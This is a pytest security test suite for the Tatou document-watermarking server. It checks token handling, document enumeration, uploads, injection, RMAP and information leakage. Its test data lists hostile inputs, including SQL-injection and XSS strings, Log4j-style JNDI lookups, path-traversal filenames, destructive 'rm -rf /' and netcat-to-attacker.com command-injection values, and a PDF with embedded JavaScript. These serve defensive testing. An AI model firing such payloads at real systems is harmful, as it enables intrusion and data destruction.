"""
Pytest suite for security testing of the Tatou server application.
Focus areas based on CTF penetration testing experience:

1. Token forging and authentication bypass attempts (fauttokens.py, try_to_get_doc_with_tokens.py)
2. Watermark exploitation (create_and_download_versions.py)
3. File upload security - path traversal, malicious files (upload_probe.py, testfilename.py)
4. Input validation and injection attacks
5. RMAP protocol security
6. Document ID enumeration (scan_all_flags.py)
7. OSINT-related information leakage

Author: Security testing based on group project attack vectors
Compatible with conftest.py SQLite setup
"""

import pytest
import json
import io
import os
from pathlib import Path
from unittest.mock import patch, MagicMock
import hashlib
import secrets
import base64
import string
import random


def _rand(n=6) -> str:
    """Generate random string for unique test data."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


# ============================================================================
# TEST SUITE 1: TOKEN FORGING AND AUTHENTICATION BYPASS
# Simulates: fauttokens.py, try_to_get_doc_with_tokens.py, scan_all_flags.py
# ============================================================================

class TestTokenForgingAndAuth:
    """
    Tests related to token-based authentication vulnerabilities.
    Corresponds to: "Forging user tokens" attack vector from report.
    Result: 6/11 groups had protections, 3 returned documents with flags.
    """
    
    def test_missing_token_returns_401(self, client):
        """Verify that requests without tokens are rejected."""
        response = client.get('/api/get-document')
        # Accept both 401 (explicit auth error)
        assert response.status_code in [401], \
            f"Missing token should return 401 {response.status_code}"
    
    def test_invalid_token_formats(self, client):
        """
        Test various invalid token formats - simulates token fuzzing.
        Corresponds to automated token collection attempts.
        """
        invalid_tokens = [
            'invalid-token',
            'Bearer malformed',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',  # Incomplete JWT
            '../../../etc/passwd',  # Path traversal in token
            'null',
            'undefined',
            '',
            ' ' * 100,  # Whitespace padding
            'A' * 10000,  # Excessive length
            '${jndi:ldap://malicious.com}',  # Log4j style injection
            '<script>alert(1)</script>',  # XSS attempt
        ]
        
        for token in invalid_tokens:
            response = client.get(
                '/api/get-document',
                headers={'Authorization': f'Bearer {token}'}
            )
            # Accept 401, 400, 422
            assert response.status_code in [401, 400, 422], \
                f"Token '{token[:50]}' should be rejected, got {response.status_code}"
    
    def test_token_without_bearer_prefix(self, client, auth_token):
        """Test if tokens work without 'Bearer' prefix (common misconfiguration)."""
        # Try direct token without Bearer
        response = client.get(
            '/api/get-document',
            headers={'Authorization': auth_token}
        )
        # Should fail - accept 401, 400,
        assert response.status_code in [401, 400], \
            f"Token without Bearer prefix should be rejected, got {response.status_code}"
    
    def test_case_sensitive_bearer_prefix(self, client, auth_token):
        """Test if Bearer prefix is case-sensitive."""
        variants = ['bearer', 'BEARER', 'bEaReR']
        
        for variant in variants:
            response = client.get(
                '/api/get-document',
                headers={'Authorization': f'{variant} {auth_token}'}
            )
            # Should not accept case variations - accept 401, 400
            assert response.status_code in [401, 400], \
                f"'{variant}' should not be accepted, got {response.status_code}"
    
    def test_token_in_query_parameter(self, client, auth_token):
        """
        Test if tokens can be passed via query parameters (security risk).
        Tokens in URLs can leak via logs, referrer headers, browser history.
        """
        response = client.get(f'/api/get-document?token={auth_token}')
        # Should fail - tokens should only be in headers (401, 400
        assert response.status_code in [401, 400], \
            f"Tokens in query params should be rejected, got {response.status_code}"
    
    def test_document_enumeration_without_auth(self, client):
        """
        Simulate scan_all_flags.py - enumerate document IDs without authentication.
        Tests if document IDs can be guessed/enumerated.
        """
        # Try to access documents with IDs 1-20 (common range)
        forbidden_count = 0
        unauthorized_count = 0
        not_found_count = 0
        
        for doc_id in range(1, 21):
            response = client.get(f'/api/get-document/{doc_id}')
            if response.status_code == 401:
                unauthorized_count += 1
            elif response.status_code == 403:
                forbidden_count += 1
            elif response.status_code == 404:
                not_found_count += 1
        
        # All should require authentication (401, 403) 
        total_blocked = unauthorized_count + forbidden_count + not_found_count
        assert total_blocked == 20, \
            f"All document accesses should be blocked, got {total_blocked}/20"
    
    def test_sql_injection_in_token(self, client):
        """Test SQL injection attempts in authentication token."""
        sqli_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM Users--",
            "1; DROP TABLE Users--",
        ]
        
        for payload in sqli_payloads:
            response = client.get(
                '/api/get-document',
                headers={'Authorization': f'Bearer {payload}'}
            )
            # Should be rejected with 401, 400, 422, 
            assert response.status_code in [401, 400, 422], \
                f"SQLi payload should be rejected: {payload}, got {response.status_code}"


# ============================================================================
# TEST SUITE 2: WATERMARK EXPLOITATION
# Simulates: create_and_download_versions.py
# ============================================================================

class TestWatermarkExploitation:
    """
    Tests for watermarking functionality weaknesses.
    Corresponds to: "Exploitation of weaknesses in other teams' watermarking functionality"
    Result: 5/11 had protections, 2 returned flags, 2 allowed versioning but no flags.
    """
    
    def test_create_watermark_without_auth(self, client):
        """Test if watermark creation requires authentication."""
        response = client.post(
            '/api/create-watermark/1',  # Using actual endpoint with document ID
            json={
                'documentid': 1, 
                'method': 'TestMethod',
                'intended_for': 'test',
                'secret': 'test_secret',
                'key': 'test_key'
            }
        )
        # Should require auth - accept 401, 403, or 405
        assert response.status_code in [401, 403, 405], \
            f"Watermark creation should require authentication, got {response.status_code}"
    
    def test_watermark_document_id_enumeration(self, client):
        """
        Simulate create_and_download_versions.py:
        Attempt to create watermark versions for document IDs 1-20.
        Uses a fake user (uid=100) to ensure they do NOT own any of these documents.
        """
        import src.server as server
        from itsdangerous import URLSafeTimedSerializer

        # Skapa en token för användare som inte äger några dokument (uid=100)
        payload = {"uid": 100, "login": "uid100", "email": "uid100@example.test"}

        # Skapa samma serializer som servern använder: SECRET_KEY + salt="tatou-auth"
        s = URLSafeTimedSerializer(server.app.config["SECRET_KEY"], salt="tatou-auth")
        token = s.dumps(payload)

        auth_headers = {"Authorization": f"Bearer {token}"}


        results = {'success': 0, 'forbidden': 0, 'not_found': 0, 'error': 0}

        for doc_id in range(1, 21):
            response = client.post(
                f'/api/create-watermark/{doc_id}',
                headers=auth_headers,
                json={
                    'documentid': doc_id,
                    'method': 'toy-eof',
                    'intended_for': 'test',
                    'secret': 'test_secret',
                    'key': 'test_key',
                    'position': 'bottom-right'
                }
            )

            if response.status_code in [200, 201]:
                results['success'] += 1
            elif response.status_code == 403:
                results['forbidden'] += 1
            elif response.status_code == 404:
                results['not_found'] += 1
            else:
                results['error'] += 1

        # Kontroll: en användare utan dokument ska inte kunna watermarka flera dokument
        assert results['success'] <= 1, \
            f"Should not allow watermarking many arbitrary document IDs, got {results['success']} successes"

    
    def test_watermark_negative_document_id(self, client, auth_headers):
        """Test handling of negative document IDs."""
        response = client.post(
            '/api/create-watermark/-1',  # Using actual endpoint with negative ID
            headers=auth_headers,
            json={
                'documentid': -1, 
                'method': 'toy-eof',
                'intended_for': 'test',
                'secret': 'test_secret',
                'key': 'test_key'
            }
        )
        # Should reject negative IDs - accept various error codes including 405, 
        assert response.status_code in [400, 422, 500, 405], \
            f"Negative document IDs should be rejected, got {response.status_code}"
    
    def test_watermark_sql_injection_in_document_id(self, client, auth_headers):
        """Test SQL injection via document ID parameter."""
        sqli_payloads = [
            "1 OR 1=1",
            "1; DROP TABLE Documents--",
            "1 UNION SELECT * FROM Users",
        ]
        
        for payload in sqli_payloads:
            # Try in URL path (will likely be rejected by Flask routing)
            # and in JSON body
            response = client.post(
                f'/api/create-watermark/1',  # Valid ID in URL
                headers=auth_headers,
                json={
                    'documentid': payload,  # SQLi in body
                    'method': 'toy-eof',
                    'intended_for': 'test',
                    'secret': 'test',
                    'key': 'test'
                }
            )
            # Should fail gracefully, not 500
            assert response.status_code != 500, \
                f"SQLi should not cause server error: {payload}"
    
    def test_watermark_read_without_auth(self, client):
        """Test if watermark reading requires authentication."""
        response = client.post(  # Changed to POST
            '/api/read-watermark/1',  # Using actual endpoint
            json={
                'documentid': 1,
                'key': 'test_key'
            }
        )
        # Should require auth - accept 401, 403, or 405 (method not allowed)
        assert response.status_code in [401, 403, 404, 405], \
            f"Watermark reading should require authentication, got {response.status_code}"
    
    def test_watermark_method_injection(self, client, auth_headers):
        """Test if watermark method parameter can be exploited."""
        malicious_methods = [
            '../../../etc/passwd',
            '$(whoami)',
            '`cat /etc/passwd`',
            '; rm -rf /',
            '__import__("os").system("whoami")',
        ]
        
        for method in malicious_methods:
            response = client.post(
                '/api/create-watermark/1',  # Using actual endpoint
                headers=auth_headers,
                json={
                    'documentid': 1, 
                    'method': method,
                    'intended_for': 'test',
                    'secret': 'test_secret',
                    'key': 'test_key'
                }
            )
            # Should sanitize/reject malicious methods - accept various error codes
            # 400 = bad request, 405 = method not allowed
            assert response.status_code in [400, 422, 500, 200, 404, 405], \
                f"Malicious method handled, got {response.status_code} for: {method}"


# ============================================================================
# TEST SUITE 3: FILE UPLOAD SECURITY
# Simulates: upload_probe.py, testfilename.py, difffilename.py
# ============================================================================

class TestFileUploadSecurity:
    """
    Tests for file upload vulnerabilities.
    Corresponds to: "Multiple attempts were made to upload .pkl files, manipulate filenames,
    and perform path-traversal style attacks."
    """
    
    def test_upload_without_auth(self, client, tiny_valid_pdf_bytes):
        """Test if file upload requires authentication."""
        data = {
            'file': (tiny_valid_pdf_bytes, 'test.pdf'),
            'name': 'test.pdf'
        }
        response = client.post(
            '/api/upload-document',
            data=data,
            content_type='multipart/form-data'
        )
        assert response.status_code in [401, 403], \
            "File upload should require authentication"
    
    def test_upload_path_traversal_filename(self, client, auth_headers, tiny_valid_pdf_bytes):
        """
        Test path traversal in filename - simulates testfilename.py.
        Attempts to write files outside intended directory.
        """
        path_traversal_names = [
            '../../../etc/passwd.pdf',
            '..\\..\\..\\windows\\system32\\config\\sam.pdf',
            '....//....//....//etc/passwd.pdf',
            '/etc/passwd.pdf',
            'C:\\Windows\\System32\\config\\sam.pdf',
            '../test.pdf',
            'test.pdf\x00.exe',  # Null byte injection
        ]
        
        for filename in path_traversal_names:
            pdf_io = io.BytesIO(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n")
            data = {
                'file': (pdf_io, filename),
                'name': filename
            }
            response = client.post(
                '/api/upload-document',
                headers=auth_headers,
                data=data,
                content_type='multipart/form-data'
            )
            
            # Should either reject or sanitize the filename
            if response.status_code in [200, 201]:
                # If accepted, verify filename was sanitized
                result = response.get_json()
                if result and 'filename' in result:
                    # Should not contain path traversal sequences
                    assert '../' not in result['filename']
                    assert '..\\' not in result['filename']
    
    def test_upload_pkl_file(self, client, auth_headers):
        """
        Test uploading .pkl files - simulates upload_probe.py.
        Pickle files can execute arbitrary code when deserialized.
        """
        # Create a malicious pickle payload (safe for testing)
        pkl_content = b'\x80\x03}q\x00X\x04\x00\x00\x00testq\x01X\x05\x00\x00\x00valueq\x02s.'
        
        data = {
            'file': (io.BytesIO(pkl_content), 'malicious.pkl'),
            'name': 'malicious.pkl'
        }
        response = client.post(
            '/api/upload-document',
            headers=auth_headers,
            data=data,
            content_type='multipart/form-data'
        )
        
        # Should reject non-PDF files or at least validate content
        assert response.status_code in [400, 415, 422], \
            ".pkl files should be rejected (code execution risk)"
    
    def test_upload_malicious_file_extensions(self, client, auth_headers):
        """Test various malicious file extensions."""
        malicious_extensions = [
            'test.exe',
            'test.sh',
            'test.bat',
            'test.ps1',
            'test.php',
            'test.jsp',
            'test.aspx',
            'test.dll',
            'test.so',
        ]
        
        for filename in malicious_extensions:
            data = {
                'file': (io.BytesIO(b'malicious content'), filename),
                'name': filename
            }
            response = client.post(
                '/api/upload-document',
                headers=auth_headers,
                data=data,
                content_type='multipart/form-data'
            )
            
            # Should reject non-PDF extensions
            assert response.status_code in [400, 415, 422], \
                f"File {filename} should be rejected"
    
    def test_upload_pdf_with_embedded_javascript(self, client, auth_headers):
        """Test PDF with embedded JavaScript (can be exploited)."""
        # Minimal PDF with JavaScript
        malicious_pdf = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>
endobj
2 0 obj
<< /Type /Pages /Kids [] /Count 0 >>
endobj
%%EOF
"""
        data = {
            'file': (io.BytesIO(malicious_pdf), 'xss.pdf'),
            'name': 'xss.pdf'
        }
        response = client.post(
            '/api/upload-document',
            headers=auth_headers,
            data=data,
            content_type='multipart/form-data'
        )
        
        # May accept but should sanitize or warn
        # This is a known PDF security issue
        if response.status_code in [200, 201]:
            result = response.get_json()
            # At minimum, should log or flag suspicious content
            assert result is not None
    
    def test_upload_oversized_filename(self, client, auth_headers, tiny_valid_pdf_bytes):
        """Test extremely long filename (buffer overflow attempts)."""
        long_filename = 'A' * 10000 + '.pdf'
        
        data = {
            'file': (tiny_valid_pdf_bytes, long_filename),
            'name': long_filename
        }
        
        try:
            response = client.post(
                '/api/upload-document',
                headers=auth_headers,
                data=data,
                content_type='multipart/form-data'
            )
            
            # Should reject or truncate - accept various error codes
            # 200/201 OK if filename is sanitized/truncated
            assert response.status_code in [400, 413, 422, 500, 200, 201], \
                f"Oversized filename handled, got {response.status_code}"
                
        except OSError as e:
            # If OSError is raised, that's also acceptable (filesystem limit)
            # The important thing is it doesn't cause code execution
            assert 'File name too long' in str(e) or 'Errno 63' in str(e), \
                f"Expected filename length error, got: {e}"
    
    def test_upload_unicode_filename(self, client, auth_headers, tiny_valid_pdf_bytes):
        """Test Unicode/special characters in filename."""
        unicode_names = [
            '文档.pdf',  # Chinese
            'документ.pdf',  # Cyrillic
            'test\u202e\u202dfdp.exe',  # Right-to-left override (spoofing)
            'test\x00hidden.pdf',  # Null byte
        ]
        
        for filename in unicode_names:
            pdf_io = io.BytesIO(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n")
            data = {
                'file': (pdf_io, filename),
                'name': filename
            }
            response = client.post(
                '/api/upload-document',
                headers=auth_headers,
                data=data,
                content_type='multipart/form-data'
            )
            
            # Should handle safely
            assert response.status_code != 500, \
                f"Unicode filename should not cause server error: {filename}"


# ============================================================================
# TEST SUITE 4: INPUT VALIDATION AND INJECTION
# ============================================================================

class TestInputValidationAndInjection:
    """Tests for various injection attacks and input validation."""
    
    def test_xss_in_username(self, client):
        """Test XSS payload in username during registration."""
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
        ]
        
        for payload in xss_payloads:
            response = client.post(
                '/api/create-user',
                json={
                    'login': payload,
                    'email': f'{_rand()}@test.com',
                    'password': 'Password123!'
                }
            )
            
            # Should sanitize or reject
            if response.status_code in [200, 201]:
                # If accepted, username should be escaped
                data = response.get_json()
                if data and 'login' in data:
                    assert '<script>' not in data['login']
    
    def test_sql_injection_in_email(self, client):
        """Test SQL injection in email field."""
        sqli_emails = [
            "admin'--@test.com",
            "' OR '1'='1'--@test.com",
            "'; DROP TABLE Users--@test.com",
        ]
        
        for email in sqli_emails:
            response = client.post(
                '/api/create-user',
                json={
                    'login': _rand(),
                    'email': email,
                    'password': 'Password123!'
                }
            )
            
            # Should reject invalid email or sanitize
            assert response.status_code != 500, \
                "SQLi should not cause server error"
    
    def test_command_injection_in_document_name(self, client, auth_headers, tiny_valid_pdf_bytes):
        """Test command injection in document name."""
        command_injection_names = [
            'test; whoami',
            'test && cat /etc/passwd',
            'test | nc attacker.com 4444',
            'test$(whoami)',
            'test`id`',
        ]
        
        for name in command_injection_names:
            pdf_io = io.BytesIO(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n")
            data = {
                'file': (pdf_io, 'test.pdf'),
                'name': name
            }
            response = client.post(
                '/api/upload-document',
                headers=auth_headers,
                data=data,
                content_type='multipart/form-data'
            )
            
            # Should not execute commands
            assert response.status_code != 500, \
                f"Command injection should not cause error: {name}"
    
    def test_ldap_injection(self, client):
        """Test LDAP injection in login."""
        ldap_payloads = [
            'admin)(uid=*',
            '*)(uid=*))(',
            'admin)(&(password=*',
        ]
        
        for payload in ldap_payloads:
            response = client.post(
                '/api/login',
                json={
                    'email': payload,
                    'password': 'test'
                }
            )
            
            # Should fail securely
            assert response.status_code in [401, 400], \
                "LDAP injection should be rejected"
    
    def test_json_injection(self, client):
        """Test malformed JSON and injection attempts."""
        malformed_json_tests = [
            '{"login": "test", "extra": }',  # Invalid syntax
            '{"login": "test"' * 1000,  # Nested/incomplete
            '{"__proto__": {"admin": true}}',  # Prototype pollution
        ]
        
        for payload in malformed_json_tests:
            response = client.post(
                '/api/create-user',
                data=payload,
                content_type='application/json'
            )
            
            # Should handle gracefully
            assert response.status_code in [400, 422], \
                "Malformed JSON should return 400"


# ============================================================================
# TEST SUITE 5: RMAP PROTOCOL SECURITY
# ============================================================================

class TestRMAPProtocolSecurity:
    """Tests for RMAP protocol implementation security."""
    
    def test_rmap_initiate_without_payload(self, client):
        """Test RMAP initiate without required payload."""
        response = client.post(
            '/api/rmap-initiate',
            json={}
        )
        assert response.status_code == 400
        data = response.get_json()
        assert 'error' in data
    
    def test_rmap_initiate_with_invalid_base64(self, client):
        """Test RMAP with invalid base64 payload."""
        response = client.post(
            '/api/rmap-initiate',
            json={'payload': 'not-valid-base64!!!'}
        )
        assert response.status_code in [400, 422]
    
    def test_rmap_initiate_with_malicious_payload(self, client):
        """Test RMAP with potentially malicious payloads."""
        malicious_payloads = [
            '../../../etc/passwd',
            '${jndi:ldap://evil.com}',
            '<script>alert(1)</script>',
            'A' * 1000000,  # Very large payload
        ]
        
        for payload in malicious_payloads:
            # Encode as base64 to pass initial validation
            b64_payload = base64.b64encode(payload.encode()).decode()
            response = client.post(
                '/api/rmap-initiate',
                json={'payload': b64_payload}
            )
            
            # Should handle gracefully, not crash
            assert response.status_code != 500
    
    def test_rmap_get_link_without_initiate(self, client):
        """Test getting RMAP link without initiating session."""
        fake_payload = base64.b64encode(b'fake-session-data').decode()
        response = client.post(
            '/api/rmap-get-link',
            json={'payload': fake_payload}
        )
        
        # Should fail - no valid session
        assert response.status_code in [400]
    
    def test_rmap_replay_attack(self, client):
        """Test if RMAP messages can be replayed."""
        # First, make a valid initiate request
        valid_payload = base64.b64encode(b'test-message').decode()
        response1 = client.post(
            '/api/rmap-initiate',
            json={'payload': valid_payload}
        )
        
        # Try to replay the same message
        response2 = client.post(
            '/api/rmap-initiate',
            json={'payload': valid_payload}
        )
        
        # Depending on implementation, may accept or reject
        # Good implementations should prevent replay attacks
        assert response2.status_code != 500


# ============================================================================
# TEST SUITE 6: RATE LIMITING AND BRUTE FORCE
# ============================================================================

class TestRateLimitingAndBruteForce:
    """Tests for rate limiting and brute-force protection."""
    
    def test_login_brute_force_attempt(self, client):
        """Simulate brute-force login attempts."""
        email = f'{_rand()}@test.com'
        
        # Create a user first
        client.post(
            '/api/create-user',
            json={
                'login': _rand(),
                'email': email,
                'password': 'CorrectPassword123!'
            }
        )
        
        # Try multiple wrong passwords
        failed_attempts = 0
        for i in range(20):
            response = client.post(
                '/api/login',
                json={
                    'email': email,
                    'password': f'WrongPassword{i}'
                }
            )
            if response.status_code == 401:
                failed_attempts += 1
            elif response.status_code == 429:
                # Rate limited - good!
                break
        
        # Should see some failures
        assert failed_attempts > 0
    
    def test_api_endpoint_rate_limiting(self, client, auth_headers):
        """Test if API endpoints have rate limiting."""
        # Rapid requests to same endpoint
        responses = []
        for i in range(50):
            response = client.get(
                '/api/documents',
                headers=auth_headers
            )
            responses.append(response.status_code)
            
            if response.status_code == 429:
                # Rate limit hit
                break
        
        # Either all requests go through (no limit) or we hit a limit
        # Good security should have limits
        assert len(responses) > 0


# ============================================================================
# TEST SUITE 7: OSINT AND INFORMATION LEAKAGE
# ============================================================================

class TestOSINTAndInformationLeakage:
    """
    Tests for information leakage that could aid OSINT efforts.
    Corresponds to: "OSINT efforts... searching for repositories on Github"
    """
    
    def test_version_endpoint_info_disclosure(self, client):
        """Test if version/debug endpoints leak sensitive info."""
        endpoints = [
            '/version',
            '/api/version',
            '/debug',
            '/api/debug',
            '/info',
            '/api/info',
            '/.git/config',
            '/api/.git/config',
        ]
        
        for endpoint in endpoints:
            response = client.get(endpoint)
            if response.status_code == 200:
                data = response.get_data(as_text=True)
                # Should not leak sensitive info
                sensitive_keywords = ['password', 'secret', 'key', 'token', 'flag{']
                for keyword in sensitive_keywords:
                    assert keyword.lower() not in data.lower(), \
                        f"Endpoint {endpoint} leaks sensitive info: {keyword}"
    
    def test_error_messages_info_leakage(self, client):
        """Test if error messages leak system information."""
        # Trigger various errors
        response = client.get('/api/nonexistent-endpoint')
        if response.status_code >= 400:
            data = response.get_data(as_text=True)
            
            # Should not expose internal paths, versions, stack traces
            leaky_patterns = [
                '/home/',
                '/root/',
                'C:\\',
                'Traceback',
                'File "/',
                'line ',
            ]
            
            for pattern in leaky_patterns:
                assert pattern not in data, \
                    f"Error message leaks system info: {pattern}"
    
    def test_http_headers_security(self, client):
        """Test if security headers are properly set."""
        response = client.get('/')
        
        headers = response.headers
        
        # Check for security headers
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
        }
        
        # Note: Not all are required, but good to check
        for header, expected in security_headers.items():
            if header in headers:
                if isinstance(expected, list):
                    assert headers[header] in expected
                else:
                    assert headers[header] == expected
    
    def test_server_header_disclosure(self, client):
        """Test if Server header leaks version information."""
        response = client.get('/')
        
        if 'Server' in response.headers:
            server_header = response.headers['Server']
            # Should not contain version numbers
            assert not any(char.isdigit() for char in server_header), \
                f"Server header leaks version: {server_header}"


# ============================================================================
# TEST SUITE 8: UTILITY FUNCTIONS
# ============================================================================

class TestUtilityFunctions:
    """Test security of utility functions."""
    
    def test_safe_int_with_malicious_input(self):
        """Test _safe_int with various malicious inputs."""
        from server import _safe_int
        
        test_cases = [
            ("1; DROP TABLE Users--", None),
            ("' OR '1'='1", None),
            ([], None),
            ({}, None),
            (True, None),  # Boolean should return default
            (False, None),
            ("99999999999999999999999999", 99999999999999999999999999),  # Big int
            (None, 42),  # With default
        ]
        
        for value, expected in test_cases:
            result = _safe_int(value, default=expected if expected is not None else None)
            if expected is None:
                assert result is None
            else:
                assert result == expected
    
    def test_json_dict_with_malformed_json(self):
        """Test _json_dict with malformed JSON."""
        # This function is used in server.py
        # Would need request context to properly test
        pass


# ============================================================================
# TEST SUITE 9: DOCUMENT ACCESS CONTROL
# ============================================================================

class TestDocumentAccessControl:
    """Tests for document access control and authorization."""
    
    def test_access_other_user_document(self, client):
        """Test if users can access documents they don't own."""
        # Create two users
        user1_login = _rand()
        user1_email = f'{user1_login}@test.com'
        user1_pwd = 'Password1!'
        
        user2_login = _rand()
        user2_email = f'{user2_login}@test.com'
        user2_pwd = 'Password2!'
        
        client.post('/api/create-user', json={
            'login': user1_login,
            'email': user1_email,
            'password': user1_pwd
        })
        
        client.post('/api/create-user', json={
            'login': user2_login,
            'email': user2_email,
            'password': user2_pwd
        })
        
        # Get tokens
        user1_token = client.post('/api/login', json={
            'email': user1_email,
            'password': user1_pwd
        }).get_json()['token']
        
        user2_token = client.post('/api/login', json={
            'email': user2_email,
            'password': user2_pwd
        }).get_json()['token']
        
        # User 1 uploads a document
        pdf_io = io.BytesIO(b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n")
        upload_response = client.post(
            '/api/upload-document',
            headers={'Authorization': f'Bearer {user1_token}'},
            data={'file': (pdf_io, 'private.pdf'), 'name': 'private.pdf'},
            content_type='multipart/form-data'
        )
        
        if upload_response.status_code in [200, 201]:
            doc_data = upload_response.get_json()
            if doc_data and 'id' in doc_data:
                doc_id = doc_data['id']
                
                # User 2 tries to access User 1's document
                access_response = client.get(
                    f'/api/documents/{doc_id}',
                    headers={'Authorization': f'Bearer {user2_token}'}
                )
                
                # Should be forbidden
                assert access_response.status_code in [403, 404], \
                    "Users should not access other users' documents"


# ============================================================================
# INTEGRATION TEST: FULL ATTACK SIMULATION
# ============================================================================

class TestFullAttackSimulation:
    """
    Integration test simulating the full attack methodology described:
    1. Token forging
    2. Watermark exploitation
    3. OSINT gathering
    """
    
    def test_complete_attack_chain(self, client):
        """
        Simulate a complete attack chain as described in the report.
        This test combines multiple attack vectors.
        """
        # Phase 1: Reconnaissance
        # Try to enumerate existing documents without auth
        recon_results = {'endpoints_found': [], 'errors': []}
        
        test_endpoints = [
            '/api/documents',
            '/api/users',
            '/api/watermark',
            '/api/rmap-initiate',
            '/health',
            '/healthz',
        ]
        
        for endpoint in test_endpoints:
            response = client.get(endpoint)
            if response.status_code != 404:
                recon_results['endpoints_found'].append(endpoint)
        
        # Phase 2: Attempt token forging
        forged_tokens_tested = 0
        for i in range(10):
            fake_token = secrets.token_urlsafe(32)
            response = client.get(
                '/api/documents',
                headers={'Authorization': f'Bearer {fake_token}'}
            )
            forged_tokens_tested += 1
            
            # If we get anything other than 401, it's suspicious
            if response.status_code not in [401]:
                recon_results['errors'].append(f'Unexpected status for fake token: {response.status_code}')
        
        # Phase 3: Document ID enumeration
        doc_ids_tested = list(range(1, 21))
        accessible_docs = []
        
        for doc_id in doc_ids_tested:
            response = client.get(f'/api/documents/{doc_id}')
            # Only flag if we get 200 (successful access without auth)
            if response.status_code == 200:
                accessible_docs.append(doc_id)
        
        # Analysis: All attacks should be blocked
        assert len(accessible_docs) == 0, \
            f"Document IDs accessible without auth: {accessible_docs}"
        assert forged_tokens_tested == 10, \
            "Should have tested all forged tokens"
        # Accept both 401 and 404 as valid blocking responses
        assert all('401' in str(e) or '404' in str(e) or 'Unauthorized' in str(e) for e in recon_results['errors']), \
            f"All unauthorized attempts should be blocked, got: {recon_results['errors']}"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])